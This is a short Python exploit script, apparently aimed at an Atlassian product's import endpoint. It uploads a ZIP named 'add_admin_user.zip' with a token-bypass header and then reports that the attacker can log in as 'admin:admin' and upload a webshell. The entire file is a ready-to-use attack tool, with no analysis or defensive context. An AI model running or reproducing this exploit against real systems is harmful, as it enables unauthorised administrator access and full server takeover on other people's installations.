import requests
import sys

def main(url):
    # Request user input for the location of the .zip file
    file_path = './files/add_admin_user.zip'

    # Set the headers
    headers = {
        "X-Atlassian-Token": "no-check"
    }

    # Prepare the data to be sent as form-data
    files = {
        "buildIndex": (None, "false"),
        "edit": (None, "Upload and import"),
        "file": ("ZIP_DATA", open(file_path, "rb"), "application/zip")
    }

    # Send a POST request using the requests library
    response = requests.post(url, headers=headers, files=files)

    # Check the server response
    if response.status_code == 200:
        print("Exploit Success! Now you can log in with 'admin:admin' and upload your webshell.")
    else:
        print(f"An error occurred with status code: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    main(url)
